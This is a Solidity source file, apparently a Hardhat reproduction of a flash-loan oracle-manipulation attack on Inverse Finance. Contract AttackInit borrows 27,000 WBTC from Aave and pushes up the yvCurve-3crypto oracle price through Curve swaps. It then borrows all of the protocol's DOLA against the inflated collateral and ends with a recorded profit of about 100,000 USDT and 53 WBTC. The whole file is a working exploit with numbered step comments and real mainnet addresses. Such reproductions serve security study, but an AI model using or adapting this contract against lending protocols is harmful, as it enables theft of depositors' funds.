// SPDX-License-Identifier: agpl-3.0
pragma solidity >=0.6.12;

import { FlashLoanReceiverBase } from "./FlashLoanReceiverBase.sol";
import { ILendingPool, ILendingPoolAddressesProvider, Cerc20, IERC20, IERC20_USDT, ComptrollerInterface } from "./Interfaces.sol";
import { SafeMath } from "./Libraries.sol";
import "hardhat/console.sol";

interface ICurve { 
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
    function latestAnswer() external view returns (uint256);
}

interface ICurveRegistryExchange {
    function exchange(address _pool, address _from, address _to, uint256 _amount, uint256 expected, address receiver) external returns (uint256);
}

interface IYearnVault {
    function mint(uint mintAmount) external returns (uint);
    function deposit(uint256 amount, address recipient) external returns (uint256);
}

contract AttackInit is FlashLoanReceiverBase {
    using SafeMath for uint256;

    address owner;
    address crvToken = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address crvReg = 0x8e764bE4288B842791989DB5b8ec067279829809;
    address DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address anDOLA = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670;
    address crv_DAI_USDC_USDT = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address inv_yv_3crypto = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;
    address yv_3crypto = 0xE537B5cc158EB71037D4125BDD7538421981E6AA;
    address crv3crypto = 0xc4AD29ba4B3c580e6D59105FFf484999997675Ff;
    address wbtcAddr = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address aaveV2 = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;
    address crv_USDT_WBTC_WETH = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;
    address yv_crv3cryptoFeed = 0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C;
    address unitroller = 0x4dCf7407AE5C07f8681e1659f626E114A7667339;
    address usdtAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    constructor()
        FlashLoanReceiverBase(ILendingPoolAddressesProvider(aaveV2))
        public
    {
        owner = msg.sender;
    }

    function exploit() public {
        myFlashLoanCall();  // Exploit w/ Flash Loan as the initial capital
    }

    function exploitLogic() internal {

        uint256 yToAdd = 225 * 1e8;
        myApproveWrap(wbtcAddr, crv_USDT_WBTC_WETH, yToAdd);
        
        // 1. Deposit WBTC to 3crypto pool and get crv3crypto
        uint256[3] memory amounts = [0, yToAdd, 0];
        ICurve(crv_USDT_WBTC_WETH).add_liquidity(amounts, 0);

        uint256 crv3cryptoBal = IERC20(crv3crypto).balanceOf(address(this));
        myApproveWrap(crv3crypto, yv_3crypto, crv3cryptoBal);

        // 2. Deposit crv3crypto (to Yearn) to get yvCurve-3crypto
        IYearnVault(yv_3crypto).deposit(crv3cryptoBal, address(this));
        uint256 yvBal = IERC20(yv_3crypto).balanceOf(address(this));
        myApproveWrap(yv_3crypto, inv_yv_3crypto, uint256(-1));

        // 3. Deposit yvCurve-3crypto (to Inverse) as collateral 
        IYearnVault(inv_yv_3crypto).mint(yvBal);
        address[] memory ctokens = new address[](1);
        ctokens[0] = inv_yv_3crypto;
        ComptrollerInterface(unitroller).enterMarkets(ctokens);

        uint256 wbtcBal = IERC20(wbtcAddr).balanceOf(address(this));
        uint256 latAnswer = ICurve(yv_crv3cryptoFeed).latestAnswer();
        console.log("Oracle price before exploit is: ", latAnswer);

        // 4. Swap remaining WBTC for USDT
        myApproveWrap(wbtcAddr, crvReg, uint256(-1));
        ICurveRegistryExchange(crvReg).exchange(crv_USDT_WBTC_WETH, wbtcAddr, usdtAddr, wbtcBal, 0, address(this));

        // -- yvCurve-3crypto price skyrockets for Inverse due to oracle miscalculation
        latAnswer = ICurve(yv_crv3cryptoFeed).latestAnswer();
        console.log("Oracle price after exploit is: ", latAnswer);

        // 5. Borrow the whole amount of underlying DOLA owned by Inverse (anDOLA)
        uint256 dolaBal = IERC20(DOLA).balanceOf(anDOLA);
        Cerc20(anDOLA).borrow(dolaBal);

        uint256 usdtBal = IERC20(usdtAddr).balanceOf(address(this));

        myApproveWrap(usdtAddr, crvReg, uint256(-1));
        myApproveWrap(DOLA, crvReg, uint256(-1));

        // 6. Swap remaining USDT back for WBTC
        ICurveRegistryExchange(crvReg).exchange(crv_USDT_WBTC_WETH, usdtAddr, wbtcAddr, usdtBal, 0, address(this));

        dolaBal = IERC20(DOLA).balanceOf(address(this));

        // 7. Swap DOLA for 3crv
        address dola3pool = 0xAA5A67c256e27A5d80712c51971408db3370927D;
        ICurveRegistryExchange(crvReg).exchange(dola3pool, DOLA, crvToken, dolaBal, 0, address(this));

        // 8. Redeem 3crv for USDT
        uint256 crvBal = IERC20(crvToken).balanceOf(address(this));
        ICurve(crv_DAI_USDC_USDT).remove_liquidity_one_coin(crvBal, 2, 0);

        // 9. Convert some USDT to WBTC (to repay FL)
        usdtBal = 10 * 1e6 * 1e6;
        ICurveRegistryExchange(crvReg).exchange(crv_USDT_WBTC_WETH, usdtAddr, wbtcAddr, usdtBal, 0, address(this));
    }


    // Called after the FL is received
    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external override returns (bool)
    {
        exploitLogic();  // The attack is executed here

        for (uint i = 0; i < assets.length; i++) {  // Return the borrowed assets to AAVE
            uint amountOwing = amounts[i].add(premiums[i]);
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }

        return true;
    }

    // Request the FL
    function myFlashLoanCall() internal {
        address receiverAddress = address(this);
        address[] memory assets = new address[](1);
        assets[0] = wbtcAddr;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 27000 * 1e8;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;
        LENDING_POOL.flashLoan(receiverAddress,assets,amounts,modes,onBehalfOf,params,referralCode);
    }

    // Check the balance of a given address in the tokens targeted by the exploit
    function checkBalance(address addressToCheck) public view {
        uint balance;
        console.log("----ATK BALANCES of %s ----", addressToCheck);
        balance = IERC20(usdtAddr).balanceOf(addressToCheck);
        console.log("USDT: ", balance);        
        balance = IERC20(wbtcAddr).balanceOf(addressToCheck);
        console.log("WBTC: ", balance);
        console.log("----END BALANCES of %s ----", addressToCheck);
    }

    // USDT needs special handle of its approve function since it doesn't conform to ERC20...
    function myApproveWrap(address _tokenAddr, address _spender, uint256 _amount) internal {
        if (_tokenAddr != usdtAddr)
            require(IERC20(_tokenAddr).approve(_spender, _amount), "ApproveWrap failed");
        else
            IERC20_USDT(usdtAddr).approve(_spender, _amount);
    }
}

//
// PROFIT:
// -------
// USDT: 99.976,294967
// WBTC: 53,17069148
// 